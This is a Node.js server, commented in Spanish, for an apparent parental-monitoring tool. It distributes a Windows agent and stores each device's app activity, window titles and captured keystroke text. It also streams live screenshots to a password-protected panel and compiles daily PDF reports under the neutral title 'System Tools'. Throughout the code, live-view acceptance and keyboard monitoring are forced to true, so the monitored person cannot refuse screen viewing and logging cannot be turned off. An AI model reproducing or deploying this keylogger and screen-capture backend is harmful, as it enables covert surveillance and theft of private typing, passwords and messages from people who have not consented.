const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const PDFDocument = require('pdfkit');
const config = require('./config');

const PORT = config.port;
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

// ---------- Almacenamiento de reportes (JSON por dia) ----------
const dataDir = path.join(__dirname, 'data');
const pdfDir = path.join(dataDir, 'pdfs');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
if (!fs.existsSync(pdfDir)) fs.mkdirSync(pdfDir, { recursive: true });

function todayStr() {
  return new Date().toLocaleDateString('en-CA');
}

function reportPath(dateStr) {
  return path.join(dataDir, `report-${dateStr}.json`);
}

function loadReport(dateStr) {
  try {
    return JSON.parse(fs.readFileSync(reportPath(dateStr), 'utf8'));
  } catch (e) {
    return {};
  }
}

function saveReport(dateStr, report) {
  fs.writeFileSync(reportPath(dateStr), JSON.stringify(report, null, 2));
}

function typingPath(dateStr) {
  return path.join(dataDir, `typing-${dateStr}.json`);
}

function loadTyping(dateStr) {
  try {
    return JSON.parse(fs.readFileSync(typingPath(dateStr), 'utf8'));
  } catch (e) {
    return {};
  }
}

function saveTyping(dateStr, data) {
  fs.writeFileSync(typingPath(dateStr), JSON.stringify(data, null, 2));
}

// ---------- Generacion de PDF diario ----------
function pdfPath(dateStr) {
  return path.join(pdfDir, `reporte-${dateStr}.pdf`);
}

function sanitizePdfText(text) {
  // pdfkit (fuente Helvetica/WinAnsi) no soporta emojis ni caracteres fuera de latin-1
  return String(text == null ? '' : text)
    .replace(/[^\x00-\xFF]/g, ' ')
    .trim();
}

function formatDur(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return (h > 0 ? `${h}h ` : '') + (m > 0 ? `${m}m ` : '') + `${s}s`;
}

async function buildPdf(date) {
  const outPath = pdfPath(date);
  const report = loadReport(date);
  const typing = loadTyping(date);

  await new Promise((resolve, reject) => {
    const doc = new PDFDocument({ size: 'A4', margin: 48 });
    const stream = fs.createWriteStream(outPath);
    stream.on('finish', resolve);
    stream.on('error', reject);
    doc.pipe(stream);

    doc.fontSize(20).text('System Tools — Reporte diario', { align: 'center' });
    doc.moveDown(0.3);
    doc.fontSize(11).text(`Fecha: ${date}`, { align: 'center' });
    doc.moveDown(1);

    // Reporte de actividad
    doc.fontSize(14).text('Reporte de actividad');
    doc.moveDown(0.3);
    const deviceNames = Object.keys(report);
    if (deviceNames.length === 0) {
      doc.fontSize(10).text('Sin actividad registrada.');
    }
    for (const deviceName of deviceNames) {
      doc.fontSize(11).text(`Dispositivo: ${deviceName}`);
      const events = (report[deviceName] || []).sort((a, b) => (a.ts < b.ts ? -1 : 1));
      const totals = new Map(); // key -> { seconds, title }
      for (let i = 0; i < events.length; i++) {
        const ev = events[i];
        const endTs = i + 1 < events.length ? events[i + 1].ts : new Date().toISOString();
        const seconds = Math.max(0, (new Date(endTs) - new Date(ev.ts)) / 1000);
        const key = ev.detected || ev.app;
        if (!totals.has(key)) totals.set(key, { seconds: 0, title: ev.title });
        totals.get(key).seconds += seconds;
        if (ev.title) totals.get(key).title = ev.title;
      }
      const rows = [...totals.entries()].sort((a, b) => b[1].seconds - a[1].seconds);
      for (const [app, info] of rows) {
        const title = info.title ? ' — ' + sanitizePdfText(info.title) : '';
        doc.fontSize(10).text(`${app}: ${formatDur(info.seconds)}${title}`);
      }
      doc.moveDown(0.6);
    }

    // Actividad de teclado
    doc.moveDown(0.5);
    doc.fontSize(14).text('Actividad de teclado');
    doc.moveDown(0.3);
    const typingDevices = Object.keys(typing);
    let hasTyping = false;
    for (const deviceName of typingDevices) {
      const entries = (typing[deviceName] || []).sort((a, b) => (a.ts < b.ts ? -1 : 1));
      for (const ev of entries) {
        hasTyping = true;
        const time = ev.ts ? ev.ts.slice(11, 19) : '';
        const app = ev.detected || ev.app;
        const title = ev.title ? ` (${sanitizePdfText(ev.title)})` : '';
        doc.font('Helvetica-Bold').fontSize(10).text(`${time} — ${app}${title}`);
        doc.font('Helvetica').fontSize(10).text(sanitizePdfText(ev.text) || ' ', { indent: 22 });
        doc.moveDown(0.5);
      }
    }
    if (!hasTyping) doc.fontSize(10).text('Sin registros de teclado.');

    doc.end();
  });
  return outPath;
}

const buildingPdf = new Set();

async function ensurePdf(date) {
  const out = pdfPath(date);
  if (fs.existsSync(out)) return out;
  if (buildingPdf.has(date)) {
    while (buildingPdf.has(date)) await new Promise((r) => setTimeout(r, 200));
    return out;
  }
  buildingPdf.add(date);
  try {
    await buildPdf(date);
  } finally {
    buildingPdf.delete(date);
  }
  return out;
}

async function ensureAllPdfs() {
  const dates = new Set();
  for (const f of fs.readdirSync(dataDir)) {
    const m = f.match(/^(?:report|typing)-(\d{4}-\d{2}-\d{2})\.json$/);
    if (m) dates.add(m[1]);
  }
  for (const date of dates) {
    try {
      await ensurePdf(date);
    } catch (e) {
      console.error(`PDF fallo para ${date}:`, e.message);
    }
  }
  console.log(`PDFs sincronizados: ${dates.size} dia(s)`);
}

// ---------- Sesiones de padres ----------
const sessions = new Map();

function newSession() {
  const token = crypto.randomBytes(24).toString('hex');
  sessions.set(token, { expires: Date.now() + 24 * 3600 * 1000 });
  return token;
}

function validToken(token) {
  const s = sessions.get(token);
  if (!s) return false;
  if (s.expires < Date.now()) {
    sessions.delete(token);
    return false;
  }
  return true;
}

// ---------- Estado en tiempo real ----------
const agents = new Map(); // deviceName -> { id, ws, deviceName, autoAcceptLive, lastSeen }
const watchers = new Map(); // agentId -> Set<ws> (paneles viendo la pantalla)

function broadcastAgents() {
  const list = [...agents.values()].map((a) => ({
    id: a.deviceName,
    deviceName: a.deviceName,
    online: a.ws && a.ws.readyState === 1,
    autoAcceptLive: true,
    keyboardMonitor: true,
    lastSeen: a.lastSeen
  }));
  for (const ws of panels()) {
    send(ws, { type: 'agents.updated', agents: list });
  }
}

function panels() {
  const out = [];
  for (const ws of wss.clients) {
    if (ws.role === 'panel') out.push(ws);
  }
  return out;
}

function send(ws, obj) {
  if (ws && ws.readyState === 1) {
    try {
      ws.send(JSON.stringify(obj));
    } catch (e) {
      // socket cerrado
    }
  }
}

function addWatcher(agentId, ws) {
  if (!watchers.has(agentId)) watchers.set(agentId, new Set());
  watchers.get(agentId).add(ws);
}

function removeWatcher(agentId, ws) {
  const set = watchers.get(agentId);
  if (set) {
    set.delete(ws);
    if (set.size === 0) watchers.delete(agentId);
  }
}

function watcherCount(agentId) {
  const set = watchers.get(agentId);
  return set ? set.size : 0;
}

// ---------- Descarga de agente ----------
const agenteDir = path.join(__dirname, 'agente');

app.get('/download/agent', (req, res) => {
  const bin = path.join(agenteDir, 'agente.exe');
  if (!fs.existsSync(bin)) return res.status(404).json({ error: 'Agente no encontrado' });
  res.download(bin, 'agente.exe');
});

app.get('/download/config', (req, res) => {
  const wsUrl = config.serverUrl.startsWith('ws')
    ? config.serverUrl
    : `wss://${config.serverUrl}`;
  res.setHeader('Content-Disposition', 'attachment; filename="config.json"');
  res.json({
    serverUrl: wsUrl + '/ws',
    agentKey: config.agentKey,
    deviceName: 'Mi PC',
    autoAcceptLive: true,
    activityIntervalSec: 5,
    frameIntervalSec: 0.5,
    frameMaxWidth: 1920,
    frameQuality: 85,
    captureMonitor: 'primary',
    keyboardMonitor: true,
    keyboardIdleSec: 2
  });
});

app.get('/install', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'install.html'));
});

// ---------- REST API ----------
function auth(req, res, next) {
  const h = req.headers['authorization'] || '';
  const token = h.startsWith('Bearer ') ? h.slice(7) : '';
  if (!validToken(token)) {
    return res.status(401).json({ error: 'No autorizado' });
  }
  next();
}

app.post('/api/login', (req, res) => {
  if (req.body && req.body.password === config.parentPassword) {
    return res.json({ token: newSession() });
  }
  res.status(401).json({ error: 'Contraseña incorrecta' });
});

app.get('/api/agents', auth, (req, res) => {
  const list = [...agents.values()].map((a) => ({
    id: a.deviceName,
    deviceName: a.deviceName,
    online: a.ws && a.ws.readyState === 1,
    autoAcceptLive: true,
    keyboardMonitor: true,
    lastSeen: a.lastSeen
  }));
  res.json(list);
});

app.get('/api/report', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json({ date, agents: loadReport(date) });
});

app.get('/api/typing', auth, (req, res) => {
  const date = req.query.date || todayStr();
  res.json({ date, agents: loadTyping(date) });
});

app.get('/api/pdfs', auth, (req, res) => {
  let files = [];
  try {
    files = fs.readdirSync(pdfDir).filter((f) => f.endsWith('.pdf')).sort().reverse();
  } catch (e) {}
  res.json(files.map((f) => ({ file: f, date: f.replace('reporte-', '').replace('.pdf', '') })));
});

app.get('/api/pdf', auth, async (req, res) => {
  const date = req.query.date || todayStr();
  try {
    const file = await ensurePdf(date);
    res.download(file, `reporte-${date}.pdf`);
  } catch (e) {
    res.status(500).json({ error: 'No se pudo generar el PDF', detail: String(e && e.message || e) });
  }
});

// ---------- WebSocket ----------
wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.role = null;

  ws.on('pong', () => {
    ws.isAlive = true;
  });

  ws.on('message', (raw) => {
    let data;
    try {
      data = JSON.parse(raw);
    } catch (e) {
      return;
    }
    const type = data.type;

    if (!ws.role) {
      if (type === 'agent.hello') return handleAgentHello(ws, data);
      if (type === 'panel.hello') return handlePanelHello(ws, data);
      return ws.close();
    }

    if (ws.role === 'agent') return handleAgentMessage(ws, data);
    if (ws.role === 'panel') return handlePanelMessage(ws, data);
  });

  ws.on('close', () => {
    if (ws.role === 'agent') {
      const agentId = ws.agentId;
      if (agents.get(agentId) && agents.get(agentId).ws === ws) {
        agents.delete(agentId);
      }
      watchers.delete(agentId);
      broadcastAgents();
    } else if (ws.role === 'panel') {
      for (const [agentId, set] of watchers) {
        if (set.has(ws)) removeWatcher(agentId, ws);
      }
    }
  });
});

// Intervalo de latido para detectar agentes caidos
setInterval(() => {
  for (const ws of wss.clients) {
    if (ws.isAlive === false) {
      ws.terminate();
      continue;
    }
    ws.isAlive = false;
    try {
      ws.ping();
    } catch (e) {}
  }
}, 30000);

function handleAgentHello(ws, data) {
  if (!data.agentKey || data.agentKey !== config.agentKey) {
    send(ws, { type: 'error', message: 'Clave de agente invalida' });
    return ws.close();
  }
  const deviceName = (data.deviceName || 'PC-desconocido').slice(0, 60);

  const existing = agents.get(deviceName);
  if (existing && existing.ws !== ws && existing.ws.readyState === 1) {
    existing.ws.close();
  }

  ws.role = 'agent';
  ws.agentId = deviceName;

  agents.set(deviceName, {
    deviceName,
    ws,
    autoAcceptLive: true,
    keyboardMonitor: true,
    lastSeen: Date.now()
  });

  send(ws, {
    type: 'agent.welcome',
    id: deviceName,
    autoAcceptLive: agents.get(deviceName).autoAcceptLive,
    keyboardMonitor: agents.get(deviceName).keyboardMonitor
  });
  broadcastAgents();
}

function handlePanelHello(ws, data) {
  if (!validToken(data.token)) {
    send(ws, { type: 'error', message: 'Sesion invalida' });
    return ws.close();
  }
  ws.role = 'panel';
  broadcastAgents();
}

function handleAgentMessage(ws, data) {
  const agentId = ws.agentId;
  const agent = agents.get(agentId);
  if (agent) agent.lastSeen = Date.now();

  switch (data.type) {
    case 'activity': {
      const date = todayStr();
      const report = loadReport(date);
      if (!report[agentId]) report[agentId] = [];
      report[agentId].push({
        app: data.app,
        title: data.title,
        detected: data.detected || null,
        ts: data.ts
      });
      saveReport(date, report);
      break;
    }
    case 'live.accepted': {
      for (const pws of watchers.get(agentId) || []) {
        send(pws, { type: 'live.accepted', agentId, requestId: data.requestId });
      }
      break;
    }
    case 'live.denied': {
      for (const pws of watchers.get(agentId) || []) {
        send(pws, { type: 'live.denied', agentId, requestId: data.requestId });
      }
      break;
    }
    case 'live.frame': {
      for (const pws of watchers.get(agentId) || []) {
        send(pws, { type: 'live.frame', agentId, image: data.image });
      }
      break;
    }
    case 'live.stopped': {
      for (const pws of watchers.get(agentId) || []) {
        send(pws, { type: 'live.stopped', agentId });
      }
      watchers.delete(agentId);
      break;
    }
    case 'config.applied': {
      if (agent) {
        agent.autoAcceptLive = true;
        agent.keyboardMonitor = true;
      }
      broadcastAgents();
      break;
    }
    case 'typing': {
      const date = todayStr();
      const typing = loadTyping(date);
      if (!typing[agentId]) typing[agentId] = [];
      typing[agentId].push({
        app: data.app,
        title: data.title,
        text: data.text,
        ts: data.ts
      });
      saveTyping(date, typing);
      break;
    }
  }
}

function handlePanelMessage(ws, data) {
  switch (data.type) {
    case 'live.start': {
      const agent = agents.get(data.agentId);
      if (!agent || !agent.ws || agent.ws.readyState !== 1) {
        return send(ws, { type: 'live.error', agentId: data.agentId, message: 'Agente no conectado' });
      }
      addWatcher(data.agentId, ws);
      send(agent.ws, {
        type: 'live.request',
        requestId: data.requestId || crypto.randomBytes(8).toString('hex')
      });
      send(ws, { type: 'live.requesting', agentId: data.agentId });
      break;
    }
    case 'live.stop': {
      const agent = agents.get(data.agentId);
      removeWatcher(data.agentId, ws);
      if (agent && agent.ws && agent.ws.readyState === 1 && watcherCount(data.agentId) === 0) {
        send(agent.ws, { type: 'live.stop' });
      }
      break;
    }
    case 'live.config': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, {
          type: 'live.config',
          frameMaxWidth: data.frameMaxWidth,
          frameQuality: data.frameQuality,
          frameIntervalSec: data.frameIntervalSec
        });
      }
      break;
    }
    case 'config.autoAccept': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, { type: 'config.autoAccept', value: true });
      }
      break;
    }
    case 'config.keyboardMonitor': {
      const agent = agents.get(data.agentId);
      if (agent && agent.ws && agent.ws.readyState === 1) {
        send(agent.ws, { type: 'config.keyboardMonitor', value: true });
      }
      break;
    }
    case 'agents.request': {
      broadcastAgents();
      break;
    }
  }
}

server.listen(PORT, () => {
  console.log(`Servidor en http://localhost:${PORT}`);
  ensureAllPdfs().catch((e) => console.error('PDF inicial fallo:', e.message));
});

// Re-sincroniza PDFs cada hora (genera los del dia que falten)
setInterval(() => {
  ensureAllPdfs().catch((e) => console.error('PDF periodico fallo:', e.message));
}, 60 * 60 * 1000);
